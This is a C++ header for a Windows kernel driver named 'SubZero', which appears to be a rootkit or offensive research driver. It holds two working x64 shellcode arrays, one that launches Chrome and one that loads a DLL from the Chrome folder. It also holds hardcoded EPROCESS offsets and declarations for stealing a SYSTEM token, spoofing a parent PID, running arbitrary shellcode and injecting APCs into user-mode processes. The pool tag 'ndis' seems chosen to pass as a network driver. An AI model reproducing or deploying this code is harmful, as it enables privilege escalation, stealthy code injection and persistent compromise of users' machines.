#pragma once
#include "pch.h"
#include "SubZeroCommon.h"
#include "UndocumentedImports.h"
#include <minwindef.h>

#define DRIVER_PREFIX DRIVER_NAME ": "
#define DRIVER_TAG 'ndis'
#define PARENT_PROCESS_NAME "explorer.exe"

// CreateHandleInformation.DesiredAccess terminate access
constexpr USHORT PROCESS_TERMINATE = 1;

// EPROCESS offsets
constexpr USHORT EPROCESS_PARENT_PID = 0x3e8;
constexpr USHORT EPROCESS_IMAGE_FILE_NAME = 0x450;
constexpr USHORT EPROCESS_ACTIVE_THREADS = 0x498;
constexpr USHORT EPROCESS_ACTIVE_PROCESS_LIST = 0x2F0;

constexpr UCHAR LaunchChromeShellcode[323] = {
	0x48, 0x89, 0xE0, 0x48, 0x81, 0xE4, 0x00, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x08, 0x50, 0xE8,
	0x00, 0x00, 0x00, 0x00, 0x41, 0x5F, 0x48, 0x31, 0xC9, 0x65, 0x48, 0x8B, 0x41, 0x60, 0x48, 0x8B,
	0x40, 0x18, 0x48, 0x8B, 0x70, 0x20, 0x48, 0xAD, 0x48, 0x96, 0x48, 0xAD, 0x48, 0x8B, 0x58, 0x20,
	0x4D, 0x31, 0xC0, 0x44, 0x8B, 0x43, 0x3C, 0x4C, 0x89, 0xC2, 0x48, 0x01, 0xDA, 0x44, 0x8B, 0x82,
	0x88, 0x00, 0x00, 0x00, 0x49, 0x01, 0xD8, 0x48, 0x31, 0xF6, 0x41, 0x8B, 0x70, 0x20, 0x48, 0x01,
	0xDE, 0x48, 0x31, 0xC9, 0x41, 0xB9, 0x19, 0x2E, 0xB5, 0xAE, 0x48, 0xFF, 0xC1, 0x48, 0x31, 0xC0,
	0x8B, 0x04, 0x8E, 0x48, 0x01, 0xD8, 0x51, 0x48, 0x89, 0xC1, 0xBA, 0x01, 0x00, 0x00, 0x00, 0xE8,
	0x71, 0x00, 0x00, 0x00, 0x59, 0x44, 0x39, 0xC8, 0x75, 0xE0, 0x48, 0x31, 0xF6, 0x41, 0x8B, 0x70,
	0x24, 0x48, 0x01, 0xDE, 0x66, 0x8B, 0x0C, 0x4E, 0x48, 0x31, 0xF6, 0x41, 0x8B, 0x70, 0x1C, 0x48,
	0x01, 0xDE, 0x48, 0x31, 0xD2, 0x8B, 0x14, 0x8E, 0x48, 0x01, 0xDA, 0x48, 0x89, 0xD7, 0x48, 0x31,
	0xD2, 0x48, 0x31, 0xC9, 0x48, 0xFF, 0xC1, 0x52, 0x48, 0x83, 0xF9, 0x0D, 0x75, 0xF6, 0x49, 0x89,
	0xE2, 0x48, 0x31, 0xC9, 0x48, 0xFF, 0xC1, 0x52, 0x48, 0x83, 0xF9, 0x03, 0x75, 0xF6, 0x49, 0x89,
	0xE3, 0x41, 0x53, 0x41, 0x52, 0x52, 0x52, 0x52, 0x52, 0x4D, 0x31, 0xC9, 0x4D, 0x31, 0xC0, 0x49,
	0x8D, 0x8F, 0xF2, 0x00, 0x00, 0x00, 0x48, 0x83, 0xEC, 0x20, 0xFF, 0xD7, 0x48, 0x81, 0xC4, 0xD0,
	0x00, 0x00, 0x00, 0xEB, 0x5C, 0x53, 0x57, 0xB8, 0x05, 0x15, 0x00, 0x00, 0x80, 0x39, 0x00, 0x74,
	0x12, 0x89, 0xC3, 0xC1, 0xE0, 0x05, 0x01, 0xD8, 0x48, 0x0F, 0xB6, 0x39, 0x01, 0xF8, 0x48, 0x01,
	0xD1, 0xEB, 0xE9, 0x5F, 0x5B, 0xC3, 0x43, 0x3A, 0x5C, 0x5C, 0x50, 0x72, 0x6F, 0x67, 0x72, 0x61,
	0x6D, 0x20, 0x46, 0x69, 0x6C, 0x65, 0x73, 0x5C, 0x5C, 0x47, 0x6F, 0x6F, 0x67, 0x6C, 0x65, 0x5C,
	0x5C, 0x43, 0x68, 0x72, 0x6F, 0x6D, 0x65, 0x5C, 0x5C, 0x41, 0x70, 0x70, 0x6C, 0x69, 0x63, 0x61,
	0x74, 0x69, 0x6F, 0x6E, 0x5C, 0x5C, 0x63, 0x68, 0x72, 0x6F, 0x6D, 0x65, 0x2E, 0x65, 0x78, 0x65,
	0x00, 0x5C, 0xC3
};

constexpr UCHAR LoadLibraryShellcode[282] = {
	0x48, 0x89, 0xE0, 0x48, 0x81, 0xE4, 0x00, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x08, 0x50, 0xE8,
	0x00, 0x00, 0x00, 0x00, 0x41, 0x5F, 0x48, 0x31, 0xC9, 0x65, 0x48, 0x8B, 0x41, 0x60, 0x48, 0x8B,
	0x40, 0x18, 0x48, 0x8B, 0x70, 0x20, 0x48, 0xAD, 0x48, 0x96, 0x48, 0xAD, 0x48, 0x8B, 0x58, 0x20,
	0x4D, 0x31, 0xC0, 0x44, 0x8B, 0x43, 0x3C, 0x4C, 0x89, 0xC2, 0x48, 0x01, 0xDA, 0x44, 0x8B, 0x82,
	0x88, 0x00, 0x00, 0x00, 0x49, 0x01, 0xD8, 0x48, 0x31, 0xF6, 0x41, 0x8B, 0x70, 0x20, 0x48, 0x01,
	0xDE, 0x48, 0x31, 0xC9, 0x41, 0xB9, 0xFB, 0xF0, 0xBF, 0x5F, 0x48, 0xFF, 0xC1, 0x48, 0x31, 0xC0,
	0x8B, 0x04, 0x8E, 0x48, 0x01, 0xD8, 0x51, 0x48, 0x89, 0xC1, 0xBA, 0x01, 0x00, 0x00, 0x00, 0xE8,
	0x3D, 0x00, 0x00, 0x00, 0x59, 0x44, 0x39, 0xC8, 0x75, 0xE0, 0x48, 0x31, 0xF6, 0x41, 0x8B, 0x70,
	0x24, 0x48, 0x01, 0xDE, 0x66, 0x8B, 0x0C, 0x4E, 0x48, 0x31, 0xF6, 0x41, 0x8B, 0x70, 0x1C, 0x48,
	0x01, 0xDE, 0x48, 0x31, 0xD2, 0x8B, 0x14, 0x8E, 0x48, 0x01, 0xDA, 0x48, 0x89, 0xD7, 0x48, 0x83,
	0xEC, 0x30, 0x49, 0x8D, 0x8F, 0xBE, 0x00, 0x00, 0x00, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0xEB,
	0x67, 0x53, 0x57, 0xB8, 0x05, 0x15, 0x00, 0x00, 0x80, 0x39, 0x00, 0x74, 0x12, 0x89, 0xC3, 0xC1,
	0xE0, 0x05, 0x01, 0xD8, 0x48, 0x0F, 0xB6, 0x39, 0x01, 0xF8, 0x48, 0x01, 0xD1, 0xEB, 0xE9, 0x5F,
	0x5B, 0xC3, 0x43, 0x3A, 0x5C, 0x5C, 0x50, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x46, 0x69,
	0x6C, 0x65, 0x73, 0x5C, 0x5C, 0x47, 0x6F, 0x6F, 0x67, 0x6C, 0x65, 0x5C, 0x5C, 0x43, 0x68, 0x72,
	0x6F, 0x6D, 0x65, 0x5C, 0x5C, 0x41, 0x70, 0x70, 0x6C, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6F, 0x6E,
	0x5C, 0x5C, 0x65, 0x76, 0x65, 0x6E, 0x74, 0x6C, 0x6F, 0x67, 0x5F, 0x70, 0x72, 0x6F, 0x76, 0x69,
	0x64, 0x65, 0x72, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x5C, 0xC3
};

struct KernelPisParameters
{
	LPVOID MmGetSystemRoutineAddress;
	LPVOID ReturnedDataAddress;
	USHORT ReturnedDataMaxSize;
};

typedef void (__stdcall * KernelPisFunction)(PVOID StartContext);

struct Globals {
	ULONG ChromePID = 0;
	ULONG ExplorerPID = 0;
	ULONG ExplorerLauncherThreadID = 0;
	ULONG ChromeFirstThreadID = 0;
	EX_RUNDOWN_REF RundownProtection= {0 };
	PVOID ObjectRegistrationHandle = nullptr;
	LARGE_INTEGER RegistryRegistrationCookie = { 0 };
};

Globals g_Globals;

// Dispatch functions
DRIVER_UNLOAD SubZeroUnload;
DRIVER_DISPATCH SubZeroCreateClose;
DRIVER_DISPATCH SubZeroDeviceControl;

// Control code handlers
NTSTATUS SetParentPID_ControlCodeHandler(_In_ PIRP Irp, _In_ PIO_STACK_LOCATION StackLocation);
NTSTATUS SetTokenToSystem_ControlCodeHandler(_In_ PIRP Irp, _In_ PIO_STACK_LOCATION StackLocation);
NTSTATUS ExecuteShellcode_ControlCodeHandler(_In_ PIRP Irp, _In_ PIO_STACK_LOCATION StackLocation);

// Notification functions
NTSTATUS OnRegistryNotify(PVOID CallbackContext, PVOID Argument1, PVOID Argument2);
OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info);
void OnProcessNotify(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo);
void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create);

// APC functions
NTSTATUS QueueAPC(PKTHREAD thread, KPROCESSOR_MODE mode, PKNORMAL_ROUTINE apcFunction);
void InjectUsermodeShellcodeAPC(const UCHAR* Shellcode, SIZE_T ShellcodeSize);

// Process util functions
NTSTATUS FindProcessByName(PCHAR ProcessName, PEPROCESS* Process);
NTSTATUS SetTokenToSystem(PEPROCESS Process, PACCESS_TOKEN Token);
